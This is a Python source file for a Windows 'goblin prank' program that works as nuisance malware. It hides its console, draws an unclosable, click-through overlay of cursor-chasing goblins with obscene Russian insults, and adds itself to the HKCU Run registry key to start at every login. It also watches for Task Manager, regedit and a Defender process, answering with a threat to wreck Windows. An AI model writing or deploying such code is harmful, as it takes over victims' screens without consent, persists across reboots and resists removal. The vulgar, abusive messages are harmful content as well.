import pygame
import pyautogui
import sys
import random
import requests
from io import BytesIO
import winreg
import os
import win32gui
import win32con
import ctypes
import psutil
import time
from PIL import Image
import io

ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

pygame.init()

screen_info = pygame.display.Info()
screen = pygame.display.set_mode((screen_info.current_w, screen_info.current_h), pygame.NOFRAME | pygame.SRCALPHA)
screen.fill((0, 0, 0, 0))  

hwnd = pygame.display.get_wm_info()['window']

win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, 
                       win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE) | win32con.WS_EX_LAYERED | win32con.WS_EX_TRANSPARENT | win32con.WS_EX_TOOLWINDOW)
win32gui.SetLayeredWindowAttributes(hwnd, 0, 255, win32con.LWA_COLORKEY)
win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, 
                      win32con.SWP_NOMOVE | win32con.SWP_NOSIZE | win32con.SWP_NOACTIVATE)

def load_image_from_url(url):
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        img = Image.open(BytesIO(response.content))
        if img.format == "WEBP":
            img = img.convert("RGBA")  
        img_byte_arr = io.BytesIO()
        img.save(img_byte_arr, format="PNG")
        img_byte_arr.seek(0)
        return pygame.image.load(img_byte_arr)
    except Exception as e:
        print(f"Ошибка загрузки изображения {url}: {e}")
        fallback = pygame.Surface((100, 100), pygame.SRCALPHA)
        fallback.fill((255, 0, 0, 128))  
        return fallback

url1 = "https://media.discordapp.net/attachments/1395006928786296833/1395083217014624297/goblin_PNG2-1869917977.png?ex=687927fe&is=6877d67e&hm=e55383f1654f303e7f510a6287cb8c5b1a3b0523ffe6e505e481dac642fd64a5&=&format=webp&quality=lossless&width=720&height=760"
url2 = "https://media.discordapp.net/attachments/1395006928786296833/1395074300540620953/goblin_PNG11-2440144969.gif?ex=68791fb0&is=6877ce30&hm=c647d19719b3858b74fe40c2d6ff9d7532b0bb420979e3892d767825e3e36555&=&width=1446&height=904"
goblin_img = load_image_from_url(url1)
goblin_img2 = load_image_from_url(url2)
goblin_rect = goblin_img.get_rect()
goblin_rect2 = goblin_img2.get_rect()

font = pygame.font.SysFont("comicsansms", 24, bold=True)

questions = [
    "Эй сука, ты кто такой?",
    "Куда бежишь чмошник, смертный?",
    "Хочешь с гоблином поболтать? тогда зови дьявола!",
    "Где НАХУЙ мой золото?!",
    "Почему ты такой медленный?",
    "Ну че сосал мне хуй?",
    "Вафельку значит хоч? иди мой хуй соси вафляжор"
]

def add_to_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, win32con.KEY_SET_VALUE)
        winreg.SetValueEx(key, "GoblinPrank", 0, winreg.REG_SZ, f'"{sys.executable}" "{os.path.abspath(__file__)}"')
        winreg.CloseKey(key)
    except Exception as e:
        pass

add_to_registry()

def draw_speech_bubble(screen, text, x, y):
    text_surface = font.render(text, True, (0, 0, 0))  
    text_rect = text_surface.get_rect(center=(x, y - 50))
    bubble_rect = text_rect.inflate(20, 10)  
    pygame.draw.rect(screen, (255, 255, 255), bubble_rect, border_radius=10)  
    pygame.draw.polygon(screen, (255, 255, 255), [(x, y - 10), (x - 10, y - 20), (x + 10, y - 20)])  
    screen.blit(text_surface, text_rect)

def check_processes():
    processes = ["Taskmgr.exe", "MSASCuiL.exe", "regedit.exe"]
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] in processes:
            return True
    return False

clock = pygame.time.Clock()
question_timer = 0
spawn_timer = 0
current_question = random.choice(questions)
goblins = [(goblin_img, goblin_rect, True, 0, 0)]  
defense_mode = False
defense_timer = 0
alert_mode = False
alert_timer = 0
last_process_check = time.time()

while True:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            continue
        if event.type == pygame.MOUSEBUTTONDOWN:
            mouse_pos = pygame.mouse.get_pos()
            for img, rect, has_speech, dx, dy in goblins:
                if rect.collidepoint(mouse_pos):
                    defense_mode = True
                    defense_timer = 3000
                    current_question = "Угу, соси хуй"
                    goblins.append((goblin_img2, goblin_rect2.copy(), False, random.uniform(-2, 2), random.uniform(-2, 2)))  # Второй гоблин
                    break

    if time.time() - last_process_check > 0.5:
        if check_processes():
            if not alert_mode:
                alert_mode = True
                alert_timer = 3000
                current_question = "Опа хуяку пососи) еще раз тронеш я те винду разхуря"
                goblins.append((goblin_img2, goblin_rect2.copy(), False, random.uniform(-2, 2), random.uniform(-2, 2)))  
        last_process_check = time.time()

    spawn_timer += clock.get_time()
    if spawn_timer > 20000:  
        goblin_type = random.choice([goblin_img, goblin_img2])
        rect_type = goblin_type.get_rect()
        has_speech = random.choice([True, False])
        dx = random.uniform(-2, 2) if not has_speech else 0
        dy = random.uniform(-2, 2) if not has_speech else 0
        goblins.append((goblin_type, rect_type, has_speech, dx, dy))
        spawn_timer = 0

    mouse_x, mouse_y = pyautogui.position()

    for i, (img, rect, has_speech, dx, dy) in enumerate(goblins):
        if has_speech:
            rect.centerx += (mouse_x - rect.centerx) * 0.1
            rect.centery += (mouse_y - rect.centery) * 0.1
        else:
            rect.x += dx
            rect.y += dy

            if rect.left < 0 or rect.right > screen_info.current_w:
                dx = -dx
                goblins[i] = (img, rect, has_speech, dx, dy)
            if rect.top < 0 or rect.bottom > screen_info.current_h:
                dy = -dy
                goblins[i] = (img, rect, has_speech, dx, dy)

    question_timer += clock.get_time()
    if alert_mode:
        alert_timer -= clock.get_time()
        if alert_timer <= 0:
            alert_mode = False
            current_question = random.choice(questions)
    elif defense_mode:
        defense_timer -= clock.get_time()
        if defense_timer <= 0:
            defense_mode = False
            current_question = random.choice(questions)
    elif question_timer > 3000:
        current_question = random.choice(questions)
        question_timer = 0

    screen.fill((0, 0, 0, 0))

    for img, rect, has_speech, dx, dy in goblins:
        screen.blit(img, rect)
        if has_speech:
            draw_speech_bubble(screen, current_question, rect.centerx, rect.centery)

    pygame.display.flip()
    clock.tick(30)
